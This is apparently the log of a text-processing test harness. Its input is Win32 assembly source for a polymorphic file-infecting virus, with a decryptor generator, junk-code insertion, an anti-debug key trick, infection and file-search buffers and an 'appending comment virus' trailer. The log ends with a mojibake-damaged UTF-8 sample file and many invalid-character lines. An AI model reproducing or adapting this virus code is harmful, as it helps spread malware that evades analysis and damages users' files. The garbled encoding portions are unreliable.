+02471:         add     eax,029a0beeh
+02472: Pnct:                           ,
+02473:         sub     dword ptr [LoKey+ebp],eax       ; get modifiers
+02474: Pnct:                               [ + ] ,               ;    
+02475:         push    eax
+02476: Pnct:                        
+02477:         loop    AOCPELOOP0
+02478: Pnct:                        
+02479:         mov     cl,byte ptr [LoKeyReg+ebp]      ; store LoKey
+02480: Pnct:                           ,     [ + ]             ;    
+02481:         mov     edx,dword ptr [LoKey+ebp]
+02482: Pnct:                           ,     [ + ]
+02483:         call    AddMovREGINM
+02484: Pnct:                        
+02485:         mov     ecx,ebx
+02486: Pnct:                           ,
+02487: AOCPELOOP1:
+02488: Pnct: :
+02489:         pop     eax
+02490: Pnct:                          
+02491:         push    ecx
+02492: Pnct:                        
+02493:         mov     cl,byte ptr [LoKeyReg+ebp]      ; add modifiers
+02494: Pnct:                           ,     [ + ]             ;    
+02495:         mov     edx,eax
+02496: Pnct:                           ,
+02497:         call    AddAddREGINM
+02498: Pnct:                        
+02499:         pop     ecx
+02500: Pnct:                          
+02501:         loop    AOCPELOOP1
+02502: Pnct:                        
+02503:         call    dword ptr [_GetTickCount+ebp]   ; get modifiers
+02504: Pnct:                             [ _ + ]       ;    
+02505:         and     eax,15
+02506: Pnct:                           ,
+02507:         mov     ecx,eax
+02508: Pnct:                           ,
+02509:         mov     ebx,ecx
+02510: Pnct:                           ,
+02511:         xor     eax,edi
+02512: Pnct:                           ,
+02513: AOCPELOOP2:
+02514: Pnct: :
+02515:         add     eax,029a0beeh
+02516: Pnct:                           ,
+02517:         sub     dword ptr [HiKey+ebp],eax
+02518: Pnct:                               [ + ] ,
+02519:         push    eax
+02520: Pnct:                        
+02521:         loop    AOCPELOOP2
+02522: Pnct:                        
+02523:         mov     cl,byte ptr [HiKeyReg+ebp]      ; store HiKey
+02524: Pnct:                           ,     [ + ]             ;    
+02525:         mov     edx,dword ptr [HiKey+ebp]
+02526: Pnct:                           ,     [ + ]
+02527:         call    AddMovREGINM
+02528: Pnct:                        
+02529:         mov     ecx,ebx
+02530: Pnct:                           ,
+02531: AOCPELOOP3:
+02532: Pnct: :
+02533:         pop     eax
+02534: Pnct:                          
+02535:         push    ecx
+02536: Pnct:                        
+02537:         mov     cl,byte ptr [HiKeyReg+ebp]      ; add modifiers
+02538: Pnct:                           ,     [ + ]             ;    
+02539:         mov     edx,eax
+02540: Pnct:                           ,
+02541:         call    AddAddREGINM
+02542: Pnct:                        
+02543:         pop     ecx
+02544: Pnct:                          
+02545:         loop    AOCPELOOP3
+02546: Pnct:                        
+02547:         call    GetReg
+02548: Pnct:                        
+02549:         mov     byte ptr [LoopReg+ebp],al
+02550: Pnct:                               [ + ] ,
+02551:         mov     cl,al                           ; push LoopReg
+02552: Pnct:                           ,                                                       ;    
+02553:         call    AddPushREG
+02554: Pnct:                        
+02555:         call    AddShit
+02556: Pnct:                        
+02557:         mov     cl,byte ptr [LoopReg+ebp]       ; mov loops
+02558: Pnct:                           ,     [ + ]               ;    
+02559:         mov     edx,dword ptr [CodeSize+ebp]
+02560: Pnct:                           ,     [ + ]
+02561:         call    AddMovREGINM
+02562: Pnct:                        
+02563:         call    AddShit
+02564: Pnct:                        
+02565:         push    edi
+02566: Pnct:                        
+02567:         mov     cl,byte ptr [LoKeyReg+ebp]
+02568: Pnct:                           ,     [ + ]
+02569:         call    AddXorMEMEBPREG
+02570: Pnct:                        
+02571:         mov     cl,byte ptr [LoKeyReg+ebp]
+02572: Pnct:                           ,     [ + ]
+02573:         mov     edx,01020304h
+02574: Pnct:                           ,
+02575:         call    AddAddREGINM
+02576: Pnct:                        
+02577:         call    AddShit
+02578: Pnct:                        
+02579:         mov     cl,_EBP
+02580: Pnct:                           , _
+02581:         mov     edx,04h
+02582: Pnct:                           ,
+02583:         call    AddAddREGINM
+02584: Pnct:                        
+02585:         mov     cl,byte ptr [HiKeyReg+ebp]
+02586: Pnct:                           ,     [ + ]
+02587:         call    AddXorMEMEBPREG
+02588: Pnct:                        
+02589:         mov     cl,byte ptr [HiKeyReg+ebp]
+02590: Pnct:                           ,     [ + ]
+02591:         mov     edx,01020304h
+02592: Pnct:                           ,
+02593:         call    AddSubREGINM
+02594: Pnct:                        
+02595:         call    AddShit
+02596: Pnct:                        
+02597:         mov     cl,_EBP
+02598: Pnct:                           , _
+02599:         mov     edx,04h
+02600: Pnct:                           ,
+02601:         call    AddAddREGINM
+02602: Pnct:                        
+02603:         mov     cl,byte ptr [LoopReg+ebp]       ; sub LoopReg,1
+02604: Pnct:                           ,     [ + ]               ;     ,
+02605:         mov     edx,1
+02606: Pnct:                           ,
+02607:         call    AddSubREGINM
+02608: Pnct:                        
+02609:         pop     ebx                             ; jnz xxxxxxxxxxx
+02610: Pnct:                                                                                     ;    
+02611:         mov     eax,edi
+02612: Pnct:                           ,
+02613:         sub     eax,ebx
+02614: Pnct:                           ,
+02615:         push    eax
+02616: Pnct:                        
+02617:         mov     al,75h
+02618: Pnct:                           ,
+02619:         stosb
+02620: Pnct:                
+02621:         pop     eax
+02622: Pnct:                          
+02623:         mov     ah,0feh
+02624: Pnct:                           ,
+02625:         xchg    al,ah
+02626: Pnct:                         ,
+02627:         sub     al,ah
+02628: Pnct:                           ,
+02629:         stosb
+02630: Pnct:                
+02631:         call    AddShit
+02632: Pnct:                        
+02633:         mov     cl,byte ptr [LoopReg+ebp]       ; pop LoopReg
+02634: Pnct:                           ,     [ + ]               ;    
+02635:         call    AddPopREG
+02636: Pnct:                        
+02637:         call    AddShit
+02638: Pnct:                        
+02639:         mov     al,byte ptr [LoopReg+ebp]       ; free the register
+02640: Pnct:                           ,     [ + ]               ;      
+02641:         call    FreeReg
+02642: Pnct:                        
+02643: AOCPEEND:
+02644: Pnct: :
+02645:         mov     cl,byte ptr [HiKeyReg+ebp]      ; pop HiKeyReg
+02646: Pnct:                           ,     [ + ]             ;    
+02647:         call    AddPopREG
+02648: Pnct:                        
+02649:         call    AddShit
+02650: Pnct:                        
+02651:         mov     cl,byte ptr [LoKeyReg+ebp]      ; pop LoKeyReg
+02652: Pnct:                           ,     [ + ]             ;    
+02653:         call    AddPopREG
+02654: Pnct:                        
+02655:         call    AddShit
+02656: Pnct:                        
+02657:         mov     cl,_EBP                         ; pop EBP
+02658: Pnct:                           , _                                                   ;    
+02659:         call    AddPopREG
+02660: Pnct:                        
+02661:         mov     al,0c3h                         ; ret ;)
+02662: Pnct:                           ,                                                   ;     ; )
+02663:         stosb
+02664: Pnct:                
+02665:         pop     esi
+02666: Pnct:                          
+02667:         sub     edi,esi
+02668: Pnct:                           ,
+02669:         mov     eax,edi                         ; return size of generated
+02670: Pnct:                           ,                                                   ;        
+02671:         ret
+02672: Pnct:                
+02673: ;
+02674: Pnct: ;
+02675: ; returns AL: selected register
+02676: Pnct: ;     :    
+02677: ;
+02678: Pnct: ;
+02679: GetReg:
+02680: Pnct: :
+02681:         xor     eax,eax
+02682: Pnct:                           ,
+02683:         mov     al,byte ptr [HiKey+ebp]
+02684: Pnct:                           ,     [ + ]
+02685: GetReg1:
+02686: Pnct: :
+02687:         and     al,7
+02688: Pnct:                           ,
+02689:         lea     ecx,RegStatus+ebp
+02690: Pnct:                           , +
+02691:         add     ecx,eax
+02692: Pnct:                           ,
+02693:         mov     dl,byte ptr [ecx]
+02694: Pnct:                           ,     [ ]
+02695:         or      dl,dl
+02696: Pnct:                             ,
+02697:         jz      GetReg0
+02698: Pnct:                            
+02699:         inc     al
+02700: Pnct:                          
+02701:         jmp     GetReg1
+02702: Pnct:                          
+02703: GetReg0:
+02704: Pnct: :
+02705:         mov     byte ptr [ecx],1
+02706: Pnct:                               [ ] ,
+02707:         ret
+02708: Pnct:                
+02709: ;
+02710: Pnct: ;
+02711: ;  AL: selected register to free
+02712: Pnct: ;     :        
+02713: ;
+02714: Pnct: ;
+02715: FreeReg:
+02716: Pnct: :
+02717:         and     eax,7
+02718: Pnct:                           ,
+02719:         lea     ecx,RegStatus+ebp
+02720: Pnct:                           , +
+02721:         add     ecx,eax
+02722: Pnct:                           ,
+02723:         mov     byte ptr [ecx],0
+02724: Pnct:                               [ ] ,
+02725:         ret
+02726: Pnct:                
+02727: ;
+02728: Pnct: ;
+02729: ; Polymorphic engine data
+02730: Pnct: ;      
+02731: ;
+02732: Pnct: ;
+02733: RegStatus       db      8 dup(0)                ; 1: used 0: free
+02734: Pnct:                             ( )                                 ;   :     :  
+02735: LoKeyReg        db      0
+02736: Pnct:                            
+02737: HiKeyReg        db      0
+02738: Pnct:                            
+02739: LoopReg         db      0
+02740: Pnct:                              
+02741: LoKey           dd      0
+02742: Pnct:                                  
+02743: HiKey           dd      0
+02744: Pnct:                                  
+02745: CodeSize        dd      0
+02746: Pnct:                            
+02747: ;
+02748: Pnct: ;
+02749: ;  Instruction generators
+02750: Pnct: ;      
+02751: ;
+02752: Pnct: ;
+02753: ;  EDI: Destination code
+02754: Pnct: ;     :    
+02755: ;  ECX: Reg (if aplicable)
+02756: Pnct: ;     :     (   )
+02757: ;  EDX: Inm (if aplicable)
+02758: Pnct: ;     :     (   )
+02759: ;
+02760: Pnct: ;
+02761: AddPushREG:
+02762: Pnct: :
+02763:         mov     al,050h
+02764: Pnct:                           ,
+02765:         add     al,cl
+02766: Pnct:                           ,
+02767:         stosb
+02768: Pnct:                
+02769:         ret
+02770: Pnct:                
+02771: AddPopREG:
+02772: Pnct: :
+02773:         mov     al,058h
+02774: Pnct:                           ,
+02775:         add     al,cl
+02776: Pnct:                           ,
+02777:         stosb
+02778: Pnct:                
+02779:         ret
+02780: Pnct:                
+02781: AddMovREGINM:
+02782: Pnct: :
+02783:         mov     al,0b8h
+02784: Pnct:                           ,
+02785:         add     al,cl
+02786: Pnct:                           ,
+02787:         stosb
+02788: Pnct:                
+02789:         mov     eax,edx
+02790: Pnct:                           ,
+02791:         stosd
+02792: Pnct:                
+02793:         ret
+02794: Pnct:                
+02795: AddMovREGMEMEBP:
+02796: Pnct: :
+02797:         mov     al,08bh
+02798: Pnct:                           ,
+02799:         stosb
+02800: Pnct:                
+02801:         mov     al,08h
+02802: Pnct:                           ,
+02803:         mul     cl
+02804: Pnct:                          
+02805:         add     al,85h
+02806: Pnct:                           ,
+02807:         stosb
+02808: Pnct:                
+02809:         mov     eax,edx
+02810: Pnct:                           ,
+02811:         stosd
+02812: Pnct:                
+02813:         ret
+02814: Pnct:                
+02815: AddXorMEMEBPREG:
+02816: Pnct: :
+02817:         mov     al,031h
+02818: Pnct:                           ,
+02819:         stosb
+02820: Pnct:                
+02821:         mov     al,08h
+02822: Pnct:                           ,
+02823:         mul     cl
+02824: Pnct:                          
+02825:         add     al,45h
+02826: Pnct:                           ,
+02827:         stosb
+02828: Pnct:                
+02829:         xor     al,al
+02830: Pnct:                           ,
+02831:         stosb
+02832: Pnct:                
+02833:         ret
+02834: Pnct:                
+02835: AddAddREGINM:
+02836: Pnct: :
+02837:         or      cl,cl
+02838: Pnct:                             ,
+02839:         jnz     AddAddREGINM0
+02840: Pnct:                          
+02841:         mov     al,05h
+02842: Pnct:                           ,
+02843:         stosb
+02844: Pnct:                
+02845:         jmp     AddAddREGINM1
+02846: Pnct:                          
+02847: AddAddREGINM0:
+02848: Pnct: :
+02849:         mov     al,081h
+02850: Pnct:                           ,
+02851:         stosb
+02852: Pnct:                
+02853:         mov     al,0c0h
+02854: Pnct:                           ,
+02855:         add     al,cl
+02856: Pnct:                           ,
+02857:         stosb
+02858: Pnct:                
+02859: AddAddREGINM1:
+02860: Pnct: :
+02861:         mov     eax,edx
+02862: Pnct:                           ,
+02863:         stosd
+02864: Pnct:                
+02865:         ret
+02866: Pnct:                
+02867: AddSubREGINM:
+02868: Pnct: :
+02869:         or      cl,cl
+02870: Pnct:                             ,
+02871:         jnz     AddSubREGINM0
+02872: Pnct:                          
+02873:         mov     al,2dh
+02874: Pnct:                           ,
+02875:         stosb
+02876: Pnct:                
+02877:         jmp     AddSubREGINM1
+02878: Pnct:                          
+02879: AddSubREGINM0:
+02880: Pnct: :
+02881:         mov     al,081h
+02882: Pnct:                           ,
+02883:         stosb
+02884: Pnct:                
+02885:         mov     al,0e8h
+02886: Pnct:                           ,
+02887:         add     al,cl
+02888: Pnct:                           ,
+02889:         stosb
+02890: Pnct:                
+02891: AddSubREGINM1:
+02892: Pnct: :
+02893:         mov     eax,edx
+02894: Pnct:                           ,
+02895:         stosd
+02896: Pnct:                
+02897:         ret
+02898: Pnct:                
+02899: AddShit:
+02900: Pnct: :
+02901:         mov     ah,byte ptr [HiKey+ebp]
+02902: Pnct:                           ,     [ + ]
+02903:         cmp     ah,88h
+02904: Pnct:                           ,
+02905:         ja      insJmp
+02906: Pnct:                            
+02907:         mov     bh,ah
+02908: Pnct:                           ,
+02909:         call    GetReg
+02910: Pnct:                        
+02911:         mov     bl,al
+02912: Pnct:                           ,
+02913:         mov     cl,bl
+02914: Pnct:                           ,
+02915:         call    AddPushREG
+02916: Pnct:                        
+02917:         cmp     bh,88h
+02918: Pnct:                           ,
+02919:         ja      insShitL0
+02920: Pnct:                            
+02921: insShitL1:
+02922: Pnct: :
+02923:         mov     cl,bl
+02924: Pnct:                           ,
+02925:         mov     edx,edi
+02926: Pnct:                           ,
+02927:         call    AddSubREGINM
+02928: Pnct:                        
+02929:         jmp     insShitL3
+02930: Pnct:                          
+02931: insShitL0:
+02932: Pnct: :
+02933:         xor     bh,bl
+02934: Pnct:                           ,
+02935:         mov     cl,bl
+02936: Pnct:                           ,
+02937:         xor     edx,edi
+02938: Pnct:                           ,
+02939:         call    AddAddREGINM
+02940: Pnct:                        
+02941:         cmp     bh,88h
+02942: Pnct:                           ,
+02943:         ja      insShitL1
+02944: Pnct:                            
+02945: insShitL3:
+02946: Pnct: :
+02947:         mov     cl,bl
+02948: Pnct:                           ,
+02949:         call    AddPopREG
+02950: Pnct:                        
+02951:         mov     al,bl
+02952: Pnct:                           ,
+02953:         call    FreeReg
+02954: Pnct:                        
+02955:         ret
+02956: Pnct:                
+02957: insJmp:
+02958: Pnct: :
+02959:         xor     eax,edi
+02960: Pnct:                           ,
+02961:         or      ah,ah
+02962: Pnct:                             ,
+02963:         jnz     AddShit0
+02964: Pnct:                          
+02965:         add     ah,10
+02966: Pnct:                           ,
+02967: AddShit0:
+02968: Pnct: :
+02969:         and     ah,15
+02970: Pnct:                           ,
+02971:         mov     al,0ebh
+02972: Pnct:                           ,
+02973:         stosw
+02974: Pnct:                
+02975:         movzx   eax,ah
+02976: Pnct:                       ,
+02977:         add     edi,eax
+02978: Pnct:                           ,
+02979:         ret
+02980: Pnct:                
+02981: ;
+02982: Pnct: ;
+02983: ;       Searches for the word in ax the zstring addr by esi
+02984: Pnct: ;                                  
+02985: ;       found = stc
+02986: Pnct: ;                 =  
+02987: ;       not found = clc
+02988: Pnct: ;                   =  
+02989: ;
+02990: Pnct: ;
+02991: filter:
+02992: Pnct: :
+02993:         push    esi                             ; doesn't change esi
+02994: Pnct:                                                                                   ;   '    
+02995:         push    esi                             ; 1st get the size of
+02996: Pnct:                                                                                   ;          
+02997:         xor     ecx,ecx                         ; the zstring
+02998: Pnct:                           ,                                                   ;    
+02999: filter0:
+03000: Pnct: :
+03001:         cmp     byte ptr [esi],0                ; get string size and
+03002: Pnct:                               [ ] ,                                 ;        
+03003:         je      filter1                         ; change to upper case
+03004: Pnct:                                                                               ;        
+03005:         cmp     byte ptr [esi],'a'
+03006: Pnct:                               [ ] , ' '
+03007:         jb      filterCont
+03008: Pnct:                            
+03009:         cmp     byte ptr [esi],'z'
+03010: Pnct:                               [ ] , ' '
+03011:         ja      filterCont
+03012: Pnct:                            
+03013:         sub     byte ptr [esi],'a'-'A'
+03014: Pnct:                               [ ] , ' ' - ' '
+03015: filterCont:
+03016: Pnct: :
+03017:         inc     ecx
+03018: Pnct:                          
+03019:         inc     esi
+03020: Pnct:                          
+03021:         jmp     filter0
+03022: Pnct:                          
+03023: filter1:
+03024: Pnct: :
+03025:         pop     esi                             ; now search
+03026: Pnct:                                                                                     ;    
+03027:         jmp     filter4
+03028: Pnct:                          
+03029: filter2:
+03030: Pnct: :
+03031:         cmp     word ptr [esi],ax
+03032: Pnct:                               [ ] ,
+03033:         jne     filter3
+03034: Pnct:                          
+03035:         pop     esi
+03036: Pnct:                          
+03037:         stc
+03038: Pnct:                
+03039:         ret
+03040: Pnct:                
+03041: filter3:
+03042: Pnct: :
+03043:         inc     esi
+03044: Pnct:                          
+03045:         dec     ecx
+03046: Pnct:                          
+03047: filter4:
+03048: Pnct: :
+03049:         cmp     ecx,2
+03050: Pnct:                           ,
+03051:         jnb     filter2
+03052: Pnct:                          
+03053:         pop     esi
+03054: Pnct:                          
+03055:         clc
+03056: Pnct:                
+03057:         ret
+03058: Pnct:                
+03059: ;
+03060: Pnct: ;
+03061: ; Different calls to LENDE
+03062: Pnct: ;        
+03063: ;
+03064: Pnct: ;
+03065: CLENDE0:
+03066: Pnct: :
+03067:         mov     esi,LENDE0
+03068: Pnct:                           ,
+03069:         mov     edi,LENDESIZE0
+03070: Pnct:                           ,
+03071:         mov     edx,offset littleCrypt0-offset inicio
+03072: Pnct:                           ,   -  
+03073:         mov     ecx,offset littleCrypt1-offset littleCrypt0
+03074: Pnct:                           ,   -  
+03075:         jmp     LENDE
+03076: Pnct:                          
+03077: CLENDE1:
+03078: Pnct: :
+03079:         mov     esi,LENDE1
+03080: Pnct:                           ,
+03081:         mov     edi,LENDESIZE1
+03082: Pnct:                           ,
+03083:         mov     edx,offset littleCrypt2-offset inicio
+03084: Pnct:                           ,   -  
+03085:         mov     ecx,offset littleCrypt3-offset littleCrypt2
+03086: Pnct:                           ,   -  
+03087:         jmp     LENDE
+03088: Pnct:                          
+03089: CLENDE2:
+03090: Pnct: :
+03091:         mov     esi,LENDE2
+03092: Pnct:                           ,
+03093:         mov     edi,LENDESIZE2
+03094: Pnct:                           ,
+03095:         mov     edx,offset littleCrypt4-offset inicio
+03096: Pnct:                           ,   -  
+03097:         mov     ecx,offset littleCrypt5-offset littleCrypt4
+03098: Pnct:                           ,   -  
+03099: ;
+03100: Pnct: ;
+03101: ;  Little ENcryptor/DEcryptor
+03102: Pnct: ;       /
+03103: ;
+03104: Pnct: ;
+03105: ;  IN:
+03106: Pnct: ;     :
+03107: ;      esi      offset of code to do CRC32 and get key
+03108: Pnct: ;                                        
+03109: ;      edi      size of code addressed by esi
+03110: Pnct: ;                                  
+03111: ;      edx      offset of code to encrypt/decrypt
+03112: Pnct: ;                                 /
+03113: ;      ecx      size of code to encrypt/decrypt
+03114: Pnct: ;                                 /
+03115: ;
+03116: Pnct: ;
+03117: LENDE:
+03118: Pnct: :
+03119:         pushad
+03120: Pnct:                
+03121:         or      al,al
+03122: Pnct:                             ,
+03123:         jz      decrypt
+03124: Pnct:                            
+03125:         lea     ebx,tmpVirus+ebp
+03126: Pnct:                           , +
+03127:         jmp     skipDecrypt
+03128: Pnct:                          
+03129: decrypt:
+03130: Pnct: :
+03131:         lea     ebx,inicio+ebp
+03132: Pnct:                           , +
+03133: skipDecrypt:
+03134: Pnct: :
+03135:         push    ecx edx ebx
+03136: Pnct:                            
+03137:         add     esi,ebx
+03138: Pnct:                           ,
+03139:         call    CRC32
+03140: Pnct:                        
+03141:         pop     ebx edx ecx
+03142: Pnct:                              
+03143:         xor     edi,edi                         ; anti-debug
+03144: Pnct:                           ,                                                   ;   -
+03145:         mov     edi,dword ptr fs:[edi+20h]      ; fs:[20h] must be zero
+03146: Pnct:                           ,     : [ + ]             ;   : [ ]      
+03147:         add     eax,edi                         ; else LENDE fails ;)
+03148: Pnct:                           ,                                                   ;         ; )
+03149:         xor     al,ah
+03150: Pnct:                           ,
+03151:         and     al,byte ptr [lendeFlag+ebp]
+03152: Pnct:                           ,     [ + ]
+03153:         mov     esi,edx
+03154: Pnct:                           ,
+03155:         add     esi,ebx
+03156: Pnct:                           ,
+03157: LENDELoop:
+03158: Pnct: :
+03159:         add     byte ptr [esi],ah
+03160: Pnct:                               [ ] ,
+03161:         xor     byte ptr [esi],al
+03162: Pnct:                               [ ] ,
+03163:         sub     byte ptr [esi],ah
+03164: Pnct:                               [ ] ,
+03165:         inc     esi
+03166: Pnct:                          
+03167:         loop    LENDELoop
+03168: Pnct:                        
+03169:         popad
+03170: Pnct:                
+03171:         ret
+03172: Pnct:                
+03173: lendeFlag       db      0                       ; argh! needed for 1st gen :(
+03174: Pnct:                                                                         ;   !           : (
+03175: endLENDE:
+03176: Pnct: :
+03177: vEnd    label   byte
+03178: Pnct:              
+03179: cryptEnd:
+03180: Pnct: :
+03181: crypt:                                          ; dummy decryption routine
+03182: Pnct: :                                                                                     ;      
+03183:         ret                                     ; for 1st generation
+03184: Pnct:                                                                                           ;      
+03185: ; there is the data that is not stored in the file...
+03186: Pnct: ;                       . . .
+03187: ; buffer for 1st generation
+03188: Pnct: ;        
+03189: BEGINOFBUFFER   equ     offset $
+03190: Pnct:                   $
+03191: ; needed for API search ----------------------------------------------------
+03192: Pnct: ;           - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03193: address         dd      0
+03194: Pnct:                              
+03195: names           dd      0
+03196: Pnct:                                  
+03197: ordinals        dd      0
+03198: Pnct:                            
+03199: nexports        dd      0
+03200: Pnct:                            
+03201: expcount        dd      0
+03202: Pnct:                            
+03203: kernel32        dd      0
+03204: Pnct:                            
+03205: ; for infection ------------------------------------------------------------
+03206: Pnct: ;       - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03207: fHnd            dd      0
+03208: Pnct:                                    
+03209: fhmap           dd      0
+03210: Pnct:                                  
+03211: mapMem          dd      0
+03212: Pnct:                                
+03213: fileSize        dd      0
+03214: Pnct:                            
+03215: fileAttrib      dd      0
+03216: Pnct:                        
+03217: fileTime0       dd      0,0
+03218: Pnct:                           ,
+03219: fileTime1       dd      0,0
+03220: Pnct:                           ,
+03221: fileTime2       dd      0,0
+03222: Pnct:                           ,
+03223: pad             dd      0
+03224: Pnct:                                      
+03225: fNameAddr       dd      0
+03226: Pnct:                          
+03227: pchcks          dw      0
+03228: Pnct:                                
+03229: gensize         dd      0
+03230: Pnct:                              
+03231: ; for find files -----------------------------------------------------------
+03232: Pnct: ;         - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03233: find_data               WIN32_FIND_DATA <?>     ; for finf and findn
+03234: Pnct: _                               _ _   < ? >           ;        
+03235: findHnd                 dd      0               ; find handle
+03236: Pnct:                                                                             ;    
+03237: ; for store directories ----------------------------------------------------
+03238: Pnct: ;         - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03239: currentPath     db      pathSize dup(0)         ; to store paths
+03240: Pnct:                         ( )                   ;      
+03241: tempPath        db      pathSize dup(0)         ; to store paths
+03242: Pnct:                               ( )                   ;      
+03243: ; buffer to work with virus body -------------------------------------------
+03244: Pnct: ;               - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03245: tmpVirus:       db      (offset cryptEnd-offset inicio) dup(0)
+03246: Pnct: :                           (   -   )   ( )
+03247: polyBuffer:     db      1000h dup(0)
+03248: Pnct: :                         ( )
+03249: sizeOfBuffer    equ     offset $-BEGINOFBUFFER
+03250: Pnct:                     $ -
+03251: ; --------------------------------------------------------------------------
+03252: Pnct: ;   - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03253: ; end of 1st gen buffer
+03254: Pnct: ;          
+03255: ;
+03256: Pnct: ;
+03257: ; host
+03258: Pnct: ;  
+03259: ;
+03260: Pnct: ;
+03261: exit:
+03262: Pnct: :
+03263:         push    0h
+03264: Pnct:                        
+03265:         call    ExitProcess
+03266: Pnct:                        
+03267:         jmp     exit
+03268: Pnct:                          
+03269: Ends
+03270: End     inicio
+03271: Pnct:          
+03272: ;
+03273: Pnct: ;
+03274: ; Beginig of appendig comment virus ----------------------------------------
+03275: Pnct: ;             - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03276: ;
+03277: Pnct: ;
+03278: ; Learn spanish with the bee...
+03279: Pnct: ;           . . .
+03280: ; lesson 1: basic speech level
+03281: Pnct: ;     :      
+03282: ;
+03283: Pnct: ;
+03284: ;           'Bentanucoh dohm¡: ¨Ande ki‚s ieg  oi?'
+03285: Not a valid UTF8 character
+03286: Not a valid UTF8 character
+03287: Not a valid UTF8 character
+03288: Not a valid UTF8 character
+03289: Pnct: ;                       '   :         ? '
+03290: ;
+03291: Pnct: ;
+03292: ; Appendig comment virus ends here -----------------------------------------
+03293: Pnct: ;             - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+03294: ;
+03295: Pnct: ;
+03296: Not a valid UTF8 character
+03297: Not a valid UTF8 character
+03298: Not a valid UTF8 character
+03299: Not a valid UTF8 character
+03300: Not a valid UTF8 character
+03301: Not a valid UTF8 character
+03302: Not a valid UTF8 character
+03303: Not a valid UTF8 character
+03304: Not a valid UTF8 character
+03305: Not a valid UTF8 character
+03306: Not a valid UTF8 character
+03307: Not a valid UTF8 character
+03308: Not a valid UTF8 character
+03309: Not a valid UTF8 character
+03310: Not a valid UTF8 character
+03311: Not a valid UTF8 character
+03312: Not a valid UTF8 character
+03313: Not a valid UTF8 character
+03314: Not a valid UTF8 character
+03315: Not a valid UTF8 character
+03316: Not a valid UTF8 character
+03317: Not a valid UTF8 character
+03318: Not a valid UTF8 character
+03319: Not a valid UTF8 character
+03320: Not a valid UTF8 character
+03321: Not a valid UTF8 character
+03322: Not a valid UTF8 character
+03323: Not a valid UTF8 character
+03324: Not a valid UTF8 character
+03325: Not a valid UTF8 character
+03326: Not a valid UTF8 character
+03327: Not a valid UTF8 character
+03328: Not a valid UTF8 character
+03329: Not a valid UTF8 character
+03330: Not a valid UTF8 character
+03331: Not a valid UTF8 character
+03332: Not a valid UTF8 character
+03333: Not a valid UTF8 character
+03334: Not a valid UTF8 character
+03335: Not a valid UTF8 character
+03336: Not a valid UTF8 character
+03337: Not a valid UTF8 character
+03338: Not a valid UTF8 character
+03339: Not a valid UTF8 character
+03340: Not a valid UTF8 character
+03341: Not a valid UTF8 character
+03342: Not a valid UTF8 character
+03343: Not a valid UTF8 character
+03344: Not a valid UTF8 character
+03345: Not a valid UTF8 character
+03346: Not a valid UTF8 character
+03347: Not a valid UTF8 character
+03348: Not a valid UTF8 character
+03349: Not a valid UTF8 character
+03350: Not a valid UTF8 character
+03351: Not a valid UTF8 character
+03352: Not a valid UTF8 character
+03353: Not a valid UTF8 character
+03354: Not a valid UTF8 character
+03355: Not a valid UTF8 character
+03356: Not a valid UTF8 character
+03357: Not a valid UTF8 character
+03358: Not a valid UTF8 character
+03359: Not a valid UTF8 character
+03360: Not a valid UTF8 character
+03361: Not a valid UTF8 character
+03362: Not a valid UTF8 character
+03363: Not a valid UTF8 character
+03364: Not a valid UTF8 character
+03365: Not a valid UTF8 character
+03366: Not a valid UTF8 character
+03367: Not a valid UTF8 character
+03368: Not a valid UTF8 character
+03369: Not a valid UTF8 character
+03370: Not a valid UTF8 character
+03371: Not a valid UTF8 character
+03372: Not a valid UTF8 character
+03373: Not a valid UTF8 character
+03374: Not a valid UTF8 character
+03375: Not a valid UTF8 character
+03376: **** TEST END ***** (0.8910 s.)
+03377: 
+
+Testing File [test\Unicode.txt]
+
+
+03378: UTF-8 encoded sample plain-text file
+03379: Pnct: -       -  
+03380: â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾â€¾
+03381: Pnct: â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾ â€¾
+03382: Markus Kuhn [ËˆmaÊ³kÊŠs kuËn] <http://www.cl.cam.ac.uk/~mgk25/> â€” 2002-07-25 CC BY
+03383: Pnct:     [   ]   < : / / . . . . / ~ / >   â€”   - -    
+03384: The ASCII compatible UTF-8 encoding used in this plain-text file
+03385: Pnct:       -           -  
+03386: is defined in Unicode, ISO 10646-1, and RFC 2279.
+03387: Pnct:       ,     - ,       .
+03388: Using Unicode/UTF-8, you can write in emails and source code things such as
+03389: Pnct:   / - ,                      
+03390: 	Mathematics and sciences:
+03391: Pnct: 	     :
+03392:   âˆ® Eâ‹…da = Q,  n â†’ âˆž, âˆ‘ f(i) = âˆ g(i),      âŽ§âŽ¡âŽ›â”Œâ”€â”€â”€â”€â”€â”âŽžâŽ¤âŽ«
+03393: Pnct:         =   ,         ,     ( )   =     ( ) ,            
+03394:                                             âŽªâŽ¢âŽœâ”‚aÂ²+bÂ³ âŽŸâŽ¥âŽª
+03395: Pnct:                                                                                         Â² + Â³  
+03396:   âˆ€xâˆˆâ„: âŒˆxâŒ‰ = âˆ’âŒŠâˆ’xâŒ‹, Î± âˆ§ Â¬Î² = Â¬(Â¬Î± âˆ¨ Î²),    âŽªâŽ¢âŽœâ”‚â”€â”€â”€â”€â”€ âŽŸâŽ¥âŽª
+03397: Pnct:     :     =   ,       Â¬   =   Â¬ ( Â¬     ) ,          
